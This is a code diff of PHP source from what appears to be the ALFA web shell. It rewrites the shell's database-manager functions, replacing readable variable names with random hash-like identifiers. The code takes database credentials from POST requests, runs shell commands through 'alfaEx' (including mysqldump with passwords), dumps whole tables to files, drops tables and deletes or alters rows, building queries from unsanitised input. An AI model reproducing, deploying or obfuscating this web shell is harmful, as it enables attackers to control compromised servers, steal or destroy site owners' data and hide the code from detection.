-		echo "<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a class='db-opt-id' db_target='".$db_name."' href='javascript:void(0);' onclick=\"alfaLoadTableData(this,'".$value."')\"><span class='mysql_tables' style='font-weight:unset;'>".$value."</span></a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small><span style='font-weight:unset;' class='mysql_table_count'>({$n['n']})</span></small>") . "</div></li>";
+		$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 = $dhkkpmvsd77d5e503ad1439f585ac494268b351b->fetch($dhkkpmvsd77d5e503ad1439f585ac494268b351b->query('SELECT COUNT(*) as n FROM `'.$rkptsoeg2063c1608d6e0baf80249c42e2be5804.'`'));
+		$rkptsoeg2063c1608d6e0baf80249c42e2be5804 = htmlspecialchars($rkptsoeg2063c1608d6e0baf80249c42e2be5804);
+		echo "<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='".$rkptsoeg2063c1608d6e0baf80249c42e2be5804."'>&nbsp;<a class='db-opt-id' db_target='".$nksstcaw24e8d17701309eab9a46949f1eab03b1."' href='javascript:void(0);' onclick=\"alfaLoadTableData(this,'".$rkptsoeg2063c1608d6e0baf80249c42e2be5804."')\"><span class='mysql_tables' style='font-weight:unset;'>".$rkptsoeg2063c1608d6e0baf80249c42e2be5804."</span></a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small><span style='font-weight:unset;' class='mysql_table_count'>({$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1['n']})</span></small>") . "</div></li>";
 		}
-		echo '</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="alfaMysqlTablesEvil(this);" class="db-opt-id" target=".cls-'.$db_name.'" type="checkbox" class="db-opt-id"><select onchange="alfaMysqlTablesDumpDrop(this);" class="db-opt-id" target=".cls-'.$db_name.'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="alfaMysqlTablesDumpDropBtn(this);return false;" class="db-opt-id" db_target="'.$db_name.'" target=".cls-'.$db_name.'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>';
+		echo '</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="alfaMysqlTablesEvil(this);" class="db-opt-id" target=".cls-'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'" type="checkbox" class="db-opt-id"><select onchange="alfaMysqlTablesDumpDrop(this);" class="db-opt-id" target=".cls-'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="alfaMysqlTablesDumpDropBtn(this);return false;" class="db-opt-id" db_target="'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'" target=".cls-'.$nksstcaw24e8d17701309eab9a46949f1eab03b1.'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>';
 	}
 	echo "</div></li>";
 }
@@ -4751,279 +4824,279 @@ echo "</ul></div><div class='mysql-query-results'><div class='mysql-query-result
 echo "</table></div>";
 echo "</div>";
 }else{
-echo htmlspecialchars($db->error());
+echo htmlspecialchars($dhkkpmvsd77d5e503ad1439f585ac494268b351b->error());
 }
 echo '</div>';
 alfafooter();
 }
 function alfaSql_manager_api(){
-	$db = $_POST["alfa1"];
-	$type = $_POST["alfa2"];
-	$sql_count = $_POST["alfa3"] == "true" ? true : false;
-	$db = @json_decode($db, true);
-	$conn = @mysqli_connect($db["host"], $db["user"], $db["pass"], $db["db"]);
-	@mysqli_set_charset($conn, "utf8");
-	if($conn){
-		if($type == "load_all_tables"){
-			$tables = array();
-			$q_tables = @mysqli_query($conn, "SELECT `table_schema`, `table_name` FROM `information_schema`.`tables` WHERE `table_schema` IN ('".implode("','", $db["databases"])."');");
-			$count = 0;
-			while($row = @mysqli_fetch_assoc($q_tables)){
-				if($sql_count){
-					$count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row["table_schema"].'`.`'.$row["table_name"].'`');
-					if($count_q){
-						$count = @mysqli_fetch_row($count_q);
-						$count = $count[0];
+	$dhkkpmvsd77d5e503ad1439f585ac494268b351b = $_POST["alfa1"];
+	$hcgexxko599dcce2998a6b40b1e38e8c6006cb0a = $_POST["alfa2"];
+	$fwcjopuyc89ab23398f486d0df6dc8ad44ae1d4c = $_POST["alfa3"] == "true" ? true : false;
+	$dhkkpmvsd77d5e503ad1439f585ac494268b351b = @json_decode($dhkkpmvsd77d5e503ad1439f585ac494268b351b, true);
+	$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898 = @mysqli_connect($dhkkpmvsd77d5e503ad1439f585ac494268b351b["host"], $dhkkpmvsd77d5e503ad1439f585ac494268b351b["user"], $dhkkpmvsd77d5e503ad1439f585ac494268b351b["pass"], $dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]);
+	@mysqli_set_charset($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "utf8");
+	if($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898){
+		if($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "load_all_tables"){
+			$lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453 = array();
+			$pgiuavwd8333ff77213fbb0deec756efcc0d6b4f = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "SELECT `table_schema`, `table_name` FROM `information_schema`.`tables` WHERE `table_schema` IN ('".implode("','", $dhkkpmvsd77d5e503ad1439f585ac494268b351b["databases"])."');");
+			$gstvxiofe2942a04780e223b215eb8b663cf5353 = 0;
+			while($belwysnaf1965a857bc285d26fe22023aa5ab50d = @mysqli_fetch_assoc($pgiuavwd8333ff77213fbb0deec756efcc0d6b4f)){
+				if($fwcjopuyc89ab23398f486d0df6dc8ad44ae1d4c){
+					$uawuyeal1b037e9834548dbf22f109b2c6893ce4 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, 'SELECT COUNT(*) FROM `'.$belwysnaf1965a857bc285d26fe22023aa5ab50d["table_schema"].'`.`'.$belwysnaf1965a857bc285d26fe22023aa5ab50d["table_name"].'`');
+					if($uawuyeal1b037e9834548dbf22f109b2c6893ce4){
+						$gstvxiofe2942a04780e223b215eb8b663cf5353 = @mysqli_fetch_row($uawuyeal1b037e9834548dbf22f109b2c6893ce4);
+						$gstvxiofe2942a04780e223b215eb8b663cf5353 = $gstvxiofe2942a04780e223b215eb8b663cf5353[0];
 					}
 				}
-				$tables[$row["table_schema"]][] = array("name" => $row["table_name"], "count" => (int)$count);
+				$lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453[$belwysnaf1965a857bc285d26fe22023aa5ab50d["table_schema"]][] = array("name" => $belwysnaf1965a857bc285d26fe22023aa5ab50d["table_name"], "count" => (int)$gstvxiofe2942a04780e223b215eb8b663cf5353);
 			}
-			foreach($db["databases"] as $db){
-				if(!isset($tables[$db])){
-					$tables[$db] = null;
+			foreach($dhkkpmvsd77d5e503ad1439f585ac494268b351b["databases"] as $dhkkpmvsd77d5e503ad1439f585ac494268b351b){
+				if(!isset($lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453[$dhkkpmvsd77d5e503ad1439f585ac494268b351b])){
+					$lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453[$dhkkpmvsd77d5e503ad1439f585ac494268b351b] = null;
 				}
 			}
-			echo @json_encode($tables);
-		}elseif($type == "dump_drop"){
-			if($db["mode"] == "drop"){
-				foreach ($db["tables"] as $table) {
-					@mysqli_query($conn, "DROP TABLE `".$table."`;");
+			echo @json_encode($lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453);
+		}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "dump_drop"){
+			if($dhkkpmvsd77d5e503ad1439f585ac494268b351b["mode"] == "drop"){
+				foreach ($dhkkpmvsd77d5e503ad1439f585ac494268b351b["tables"] as $qheyssydaab9e1de16f38176f86d7a92ba337a8d) {
+					@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "DROP TABLE `".$qheyssydaab9e1de16f38176f86d7a92ba337a8d."`;");
 				}
-				$tables = array();
-				$q_tables = @mysqli_query($conn, "SHOW TABLES;");
-				$count = 0;
-				while($row = @mysqli_fetch_array($q_tables)){
-					if($sql_count){
-						$count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row[0].'`');
-						if($count_q){
-							$count = @mysqli_fetch_row($count_q);
-							$count = $count[0];
+				$lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453 = array();
+				$pgiuavwd8333ff77213fbb0deec756efcc0d6b4f = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "SHOW TABLES;");
+				$gstvxiofe2942a04780e223b215eb8b663cf5353 = 0;
+				while($belwysnaf1965a857bc285d26fe22023aa5ab50d = @mysqli_fetch_array($pgiuavwd8333ff77213fbb0deec756efcc0d6b4f)){
+					if($fwcjopuyc89ab23398f486d0df6dc8ad44ae1d4c){
+						$uawuyeal1b037e9834548dbf22f109b2c6893ce4 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, 'SELECT COUNT(*) FROM `'.$belwysnaf1965a857bc285d26fe22023aa5ab50d[0].'`');
+						if($uawuyeal1b037e9834548dbf22f109b2c6893ce4){
+							$gstvxiofe2942a04780e223b215eb8b663cf5353 = @mysqli_fetch_row($uawuyeal1b037e9834548dbf22f109b2c6893ce4);
+							$gstvxiofe2942a04780e223b215eb8b663cf5353 = $gstvxiofe2942a04780e223b215eb8b663cf5353[0];
 						}
 					}
-					$tables[] = array("name" => $row[0], "count" => (int)$count);
+					$lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453[] = array("name" => $belwysnaf1965a857bc285d26fe22023aa5ab50d[0], "count" => (int)$gstvxiofe2942a04780e223b215eb8b663cf5353);
 				}
-				echo @json_encode($tables);
+				echo @json_encode($lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453);
 			}else{
 				if(strlen(alfaEx("mysqldump"))>0){
-					alfaEx("mysqldump --single-transaction --host=\"".$db["host"]."\" --user=\"".$db["user"]."\" --password=\"".$db["pass"]."\" ".$db["db"]." ".implode(" ", $db["tables"])."  > ".$db["dump_file"]);
+					alfaEx("mysqldump --single-transaction --host=\"".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["host"]."\" --user=\"".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["user"]."\" --password=\"".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["pass"]."\" ".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]." ".implode(" ", $dhkkpmvsd77d5e503ad1439f585ac494268b351b["tables"])."  > ".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["dump_file"]);
 				}else{
-					$fp = @fopen($db["dump_file"], "w");
-					foreach ($db["tables"] as $table) {
-						$res = @mysqli_query($conn, 'SHOW CREATE TABLE `'.$table.'`');
-						$create = @mysqli_fetch_array($res);
-						$sql = "DROP TABLE IF EXISTS `".$table."`;\n" . $create[1].";\n";
-						if($fp) fwrite($fp, $sql); else echo($sql);
-						$tbl_data = @mysqli_query($conn, 'SELECT * FROM `'.$table.'`');
-						$head = true;
-						while($item = @mysqli_fetch_assoc($tbl_data)){
-							$columns = array();
-							foreach($item as $k=>$v) {
-							if($v == null)
-							$item[$k] = "''";
-							elseif(is_numeric($v))
-							$item[$k] = $v;
+					$zngnwtjj0666f0acdeed38d4cd9084ade1739498 = @fopen($dhkkpmvsd77d5e503ad1439f585ac494268b351b["dump_file"], "w");
+					foreach ($dhkkpmvsd77d5e503ad1439f585ac494268b351b["tables"] as $qheyssydaab9e1de16f38176f86d7a92ba337a8d) {
+						$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, 'SHOW CREATE TABLE `'.$qheyssydaab9e1de16f38176f86d7a92ba337a8d.'`');
+						$tyxqkdic76ea0bebb3c22822b4f0dd9c9fd021c5 = @mysqli_fetch_array($ybaqpbzt9b207167e5381c47682c6b4f58a623fb);
+						$ijhaktkuac5c74b64b4b8352ef2f181affb5ac2a = "DROP TABLE IF EXISTS `".$qheyssydaab9e1de16f38176f86d7a92ba337a8d."`;\n" . $tyxqkdic76ea0bebb3c22822b4f0dd9c9fd021c5[1].";\n";
+						if($zngnwtjj0666f0acdeed38d4cd9084ade1739498) fwrite($zngnwtjj0666f0acdeed38d4cd9084ade1739498, $ijhaktkuac5c74b64b4b8352ef2f181affb5ac2a); else echo($ijhaktkuac5c74b64b4b8352ef2f181affb5ac2a);
+						$wwhlmopk6d9766debe26ea242d821d3a9bef8fb4 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, 'SELECT * FROM `'.$qheyssydaab9e1de16f38176f86d7a92ba337a8d.'`');
+						$zpqmyvjq96e89a298e0a9f469b9ae458d6afae9f = true;
+						while($geklwdir447b7147e84be512208dcc0995d67ebc = @mysqli_fetch_assoc($wwhlmopk6d9766debe26ea242d821d3a9bef8fb4)){
+							$aiidhoir54ca84a794888fe8d92834787dfa935a = array();
+							foreach($geklwdir447b7147e84be512208dcc0995d67ebc as $damiszkt8ce4b16b22b58894aa86c421e8759df3=>$hvlrcxnj9e3669d19b675bd57058fd4664205d2a) {
+							if($hvlrcxnj9e3669d19b675bd57058fd4664205d2a == null)
+							$geklwdir447b7147e84be512208dcc0995d67ebc[$damiszkt8ce4b16b22b58894aa86c421e8759df3] = "''";
+							elseif(is_numeric($hvlrcxnj9e3669d19b675bd57058fd4664205d2a))
+							$geklwdir447b7147e84be512208dcc0995d67ebc[$damiszkt8ce4b16b22b58894aa86c421e8759df3] = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a;
 							else
-							$item[$k] = "'".@mysqli_real_escape_string($conn, $v)."'";
-							$columns[] = "`".$k."`";
+							$geklwdir447b7147e84be512208dcc0995d67ebc[$damiszkt8ce4b16b22b58894aa86c421e8759df3] = "'".@mysqli_real_escape_string($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, $hvlrcxnj9e3669d19b675bd57058fd4664205d2a)."'";
+							$aiidhoir54ca84a794888fe8d92834787dfa935a[] = "`".$damiszkt8ce4b16b22b58894aa86c421e8759df3."`";
 							}
-							if($head) {
-							$sql = 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $item).')';
-							$head = false;
+							if($zpqmyvjq96e89a298e0a9f469b9ae458d6afae9f) {
+							$ijhaktkuac5c74b64b4b8352ef2f181affb5ac2a = 'INSERT INTO `'.$qheyssydaab9e1de16f38176f86d7a92ba337a8d.'` ('.implode(", ", $aiidhoir54ca84a794888fe8d92834787dfa935a).") VALUES \n\t(".implode(", ", $geklwdir447b7147e84be512208dcc0995d67ebc).')';
+							$zpqmyvjq96e89a298e0a9f469b9ae458d6afae9f = false;
 							} else
-							$sql = "\n\t,(".implode(", ", $item).')';
-							if($fp) fwrite($fp, $sql); else echo($sql);
+							$ijhaktkuac5c74b64b4b8352ef2f181affb5ac2a = "\n\t,(".implode(", ", $geklwdir447b7147e84be512208dcc0995d67ebc).')';
+							if($zngnwtjj0666f0acdeed38d4cd9084ade1739498) fwrite($zngnwtjj0666f0acdeed38d4cd9084ade1739498, $ijhaktkuac5c74b64b4b8352ef2f181affb5ac2a); else echo($ijhaktkuac5c74b64b4b8352ef2f181affb5ac2a);
 						}
-						if(!$head)
-							if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
+						if(!$zpqmyvjq96e89a298e0a9f469b9ae458d6afae9f)
+							if($zngnwtjj0666f0acdeed38d4cd9084ade1739498) fwrite($zngnwtjj0666f0acdeed38d4cd9084ade1739498, ";\n\n"); else echo(";\n\n");
 					}
 				}
-				echo @json_encode(array("status" => true, "file" => $db["dump_file"]));
+				echo @json_encode(array("status" => true, "file" => $dhkkpmvsd77d5e503ad1439f585ac494268b351b["dump_file"]));
 			}
-		}elseif($type == "load_tables"){
-			$tables = array();
-			$q_tables = @mysqli_query($conn, "SHOW TABLES;");
-			$count = 0;
-			while($row = @mysqli_fetch_array($q_tables)){
-				if($sql_count){
-					$count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row[0].'`');
-					if($count_q){
-						$count = @mysqli_fetch_row($count_q);
-						$count = $count[0];
+		}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "load_tables"){
+			$lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453 = array();
+			$pgiuavwd8333ff77213fbb0deec756efcc0d6b4f = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "SHOW TABLES;");
+			$gstvxiofe2942a04780e223b215eb8b663cf5353 = 0;
+			while($belwysnaf1965a857bc285d26fe22023aa5ab50d = @mysqli_fetch_array($pgiuavwd8333ff77213fbb0deec756efcc0d6b4f)){
+				if($fwcjopuyc89ab23398f486d0df6dc8ad44ae1d4c){
+					$uawuyeal1b037e9834548dbf22f109b2c6893ce4 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, 'SELECT COUNT(*) FROM `'.$belwysnaf1965a857bc285d26fe22023aa5ab50d[0].'`');
+					if($uawuyeal1b037e9834548dbf22f109b2c6893ce4){
+						$gstvxiofe2942a04780e223b215eb8b663cf5353 = @mysqli_fetch_row($uawuyeal1b037e9834548dbf22f109b2c6893ce4);
+						$gstvxiofe2942a04780e223b215eb8b663cf5353 = $gstvxiofe2942a04780e223b215eb8b663cf5353[0];
 					}
 				}
-				$tables[] = array("name" => $row[0], "count" => (int)$count);
+				$lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453[] = array("name" => $belwysnaf1965a857bc285d26fe22023aa5ab50d[0], "count" => (int)$gstvxiofe2942a04780e223b215eb8b663cf5353);
 			}
-			echo @json_encode($tables);
-		}elseif($type == "alter"){
-			$db["alter"]["type"] = strtolower($db["alter"]["type"]);
-			$inputs = $db["alter"]["type"]."(".$db["alter"]["input"].")";
-			$text_input = array("longtext", "text", "mediumtext", "tinytext");
-			if(in_array($db["alter"]["type"], $text_input)){
-				$inputs = $db["alter"]["type"];
+			echo @json_encode($lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453);
+		}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "alter"){
+			$dhkkpmvsd77d5e503ad1439f585ac494268b351b["alter"]["type"] = strtolower($dhkkpmvsd77d5e503ad1439f585ac494268b351b["alter"]["type"]);
+			$wahcjdhba8aff967e1649a1c82ea607c881e8091 = $dhkkpmvsd77d5e503ad1439f585ac494268b351b["alter"]["type"]."(".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["alter"]["input"].")";
+			$pmaqfylbe1ba83437c55caa1b29b1d3228f2591a = array("longtext", "text", "mediumtext", "tinytext");
+			if(in_array($dhkkpmvsd77d5e503ad1439f585ac494268b351b["alter"]["type"], $pmaqfylbe1ba83437c55caa1b29b1d3228f2591a)){
+				$wahcjdhba8aff967e1649a1c82ea607c881e8091 = $dhkkpmvsd77d5e503ad1439f585ac494268b351b["alter"]["type"];
 			}
-			@mysqli_query($conn, "ALTER TABLE `".$db["table"]."` MODIFY COLUMN `".$db["column"]."` " . $inputs);
-			$error = @mysqli_error($conn);
-			if($error){
-				echo $error;
+			@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "ALTER TABLE `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."` MODIFY COLUMN `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["column"]."` " . $wahcjdhba8aff967e1649a1c82ea607c881e8091);
+			$kowlomtecb5e100e5a9a3e7f6d1fd97512215282 = @mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898);
+			if($kowlomtecb5e100e5a9a3e7f6d1fd97512215282){
+				echo $kowlomtecb5e100e5a9a3e7f6d1fd97512215282;
 			}else{
 				echo "ok";
 			}
-		}elseif($type == "edit" || $type == "delete" || $type == "delete_all"){
-			if($type == "edit"){
-				$q = @mysqli_query($conn, "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` WHERE `".$db["col_key"]."` = '".addslashes($db["key"])."' LIMIT 0,1");
-				$row = @mysqli_fetch_assoc($q);
-				if($row){
-					$columns_query = @mysqli_query($conn, "SELECT COLUMN_NAME as name, COLUMN_TYPE, DATA_TYPE as type FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$db["db"]."' AND `TABLE_NAME` = '".$db["table"]."'");
-					$columns = array();
-					$edit_data = array();
-					while($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
-						$input = array("col_type" => $row2["COLUMN_TYPE"]);
-						$row2["type"] = strtolower($row2["type"]);
-						switch($row2["type"]){
+		}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "edit" || $hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "delete" || $hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "delete_all"){
+			if($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "edit"){
+				$oxvxipgy7694f4a66316e53c8cdd9d9954bd611d = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "SELECT * FROM `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."`.`".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."` WHERE `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["col_key"]."` = '".addslashes($dhkkpmvsd77d5e503ad1439f585ac494268b351b["key"])."' LIMIT 0,1");
+				$belwysnaf1965a857bc285d26fe22023aa5ab50d = @mysqli_fetch_assoc($oxvxipgy7694f4a66316e53c8cdd9d9954bd611d);
+				if($belwysnaf1965a857bc285d26fe22023aa5ab50d){
+					$ylrerbsc7d923585d45eaf069fa072333facbbe1 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "SELECT COLUMN_NAME as name, COLUMN_TYPE, DATA_TYPE as type FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."' AND `TABLE_NAME` = '".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."'");
+					$aiidhoir54ca84a794888fe8d92834787dfa935a = array();
+					$txqmhlxbddc8fc04e97385e66850818269bc89af = array();
+					while($rfymspstcb08a1efc05437dd1a1358f362b2ecb8 = @mysqli_fetch_array($ylrerbsc7d923585d45eaf069fa072333facbbe1, MYSQLI_ASSOC)){
+						$fxayuezca43c1b0aa53a0c908810c06ab1ff3967 = array("col_type" => $rfymspstcb08a1efc05437dd1a1358f362b2ecb8["COLUMN_TYPE"]);
+						$rfymspstcb08a1efc05437dd1a1358f362b2ecb8["type"] = strtolower($rfymspstcb08a1efc05437dd1a1358f362b2ecb8["type"]);
+						switch($rfymspstcb08a1efc05437dd1a1358f362b2ecb8["type"]){
 							case "longtext": case "text": case "mediumtext": case "tinytext":
-								$input["tag"] = "textarea";
+								$fxayuezca43c1b0aa53a0c908810c06ab1ff3967["tag"] = "textarea";
 							break;
 							case "int": case "smallint": case "bigint": case "tinyint": case "mediumint":
-								$input["tag"] = "input";
-								$input["type"] = "number";
+								$fxayuezca43c1b0aa53a0c908810c06ab1ff3967["tag"] = "input";
+								$fxayuezca43c1b0aa53a0c908810c06ab1ff3967["type"] = "number";
 							break;
 							default:
-								$input["tag"] = "input";
-								$input["type"] = "text";
+								$fxayuezca43c1b0aa53a0c908810c06ab1ff3967["tag"] = "input";
+								$fxayuezca43c1b0aa53a0c908810c06ab1ff3967["type"] = "text";
 						}
-						$columns[$row2["name"]] = $input;
+						$aiidhoir54ca84a794888fe8d92834787dfa935a[$rfymspstcb08a1efc05437dd1a1358f362b2ecb8["name"]] = $fxayuezca43c1b0aa53a0c908810c06ab1ff3967;
 					}
-					foreach($row as $key => $v){
-						$edit_data[] = array("col" => $key, "value" => htmlspecialchars($v, ENT_QUOTES, 'UTF-8'), "type" => $columns[$key]);
+					foreach($belwysnaf1965a857bc285d26fe22023aa5ab50d as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $hvlrcxnj9e3669d19b675bd57058fd4664205d2a){
+						$txqmhlxbddc8fc04e97385e66850818269bc89af[] = array("col" => $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, "value" => htmlspecialchars($hvlrcxnj9e3669d19b675bd57058fd4664205d2a, ENT_QUOTES, 'UTF-8'), "type" => $aiidhoir54ca84a794888fe8d92834787dfa935a[$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d]);
 					}
-					echo @json_encode($edit_data);
+					echo @json_encode($txqmhlxbddc8fc04e97385e66850818269bc89af);
 				}
 			}else{
-				if($type == "delete_all"){
-					$rows = implode("', '", $db["rows"]);
+				if($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "delete_all"){
+					$uitfbsewdf347a373b8f92aa0ae3dd920a5ec2f6 = implode("', '", $dhkkpmvsd77d5e503ad1439f585ac494268b351b["rows"]);
 				}else{
-					$rows = addslashes($db["key"]);
+					$uitfbsewdf347a373b8f92aa0ae3dd920a5ec2f6 = addslashes($dhkkpmvsd77d5e503ad1439f585ac494268b351b["key"]);
 				}
-				$query = "DELETE FROM `".$db["db"]."`.`".$db["table"]."` WHERE `".$db["col_key"]."` IN ('".$rows."')";
-				@mysqli_query($conn, $query);
-				$error = @mysqli_error($conn);
-				if($error){
-				 	$status = false;
+				$ciexurcd1b1cc7f086b3f074da452bc3129981eb = "DELETE FROM `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."`.`".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."` WHERE `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["col_key"]."` IN ('".$uitfbsewdf347a373b8f92aa0ae3dd920a5ec2f6."')";
+				@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, $ciexurcd1b1cc7f086b3f074da452bc3129981eb);
+				$kowlomtecb5e100e5a9a3e7f6d1fd97512215282 = @mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898);
+				if($kowlomtecb5e100e5a9a3e7f6d1fd97512215282){
+				 	$mopdlojt9acb44549b41563697bb490144ec6258 = false;
 				}else{
-				 	$status = true;
+				 	$mopdlojt9acb44549b41563697bb490144ec6258 = true;
 				}
-				echo @json_encode(array("status" => $status, "error" => $error, "query" => $query));
+				echo @json_encode(array("status" => $mopdlojt9acb44549b41563697bb490144ec6258, "error" => $kowlomtecb5e100e5a9a3e7f6d1fd97512215282, "query" => $ciexurcd1b1cc7f086b3f074da452bc3129981eb));
 			}
-		}elseif($type == "update"){
-			$query = "UPDATE `".$db["db"]."`.`".$db["table"]."` SET ";
-			foreach($db["data"] as $col => $val){
-				$query .= "`".$col."` = '".mysqli_real_escape_string($conn, $val)."',";
+		}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "update"){
+			$ciexurcd1b1cc7f086b3f074da452bc3129981eb = "UPDATE `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."`.`".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."` SET ";
+			foreach($dhkkpmvsd77d5e503ad1439f585ac494268b351b["data"] as $hibqnbdud89e2ddb530bb8953b290ab0793aecb0 => $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){
+				$ciexurcd1b1cc7f086b3f074da452bc3129981eb .= "`".$hibqnbdud89e2ddb530bb8953b290ab0793aecb0."` = '".mysqli_real_escape_string($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)."',";
 			}
-			$query = substr($query, 0, -1);
-		    $query .= "WHERE `".$db["col_key"]."` = '".$db["key"]."'";
-			$res = @mysqli_query($conn, $query);
-			echo @json_encode(array("status" => $res, "error" => @mysqli_error($conn)));
-		}elseif($type == "insert"){
-			$query = "INSERT INTO `".$db["db"]."`.`".$db["table"]."` ";
-			foreach($db["data"] as $col => $val){
-				$cols .= $col . ",";
-				$vals .= "'".mysqli_real_escape_string($conn, $val)."',";
+			$ciexurcd1b1cc7f086b3f074da452bc3129981eb = substr($ciexurcd1b1cc7f086b3f074da452bc3129981eb, 0, -1);
+		    $ciexurcd1b1cc7f086b3f074da452bc3129981eb .= "WHERE `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["col_key"]."` = '".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["key"]."'";
+			$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, $ciexurcd1b1cc7f086b3f074da452bc3129981eb);
+			echo @json_encode(array("status" => $ybaqpbzt9b207167e5381c47682c6b4f58a623fb, "error" => @mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898)));
+		}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "insert"){
+			$ciexurcd1b1cc7f086b3f074da452bc3129981eb = "INSERT INTO `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."`.`".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."` ";
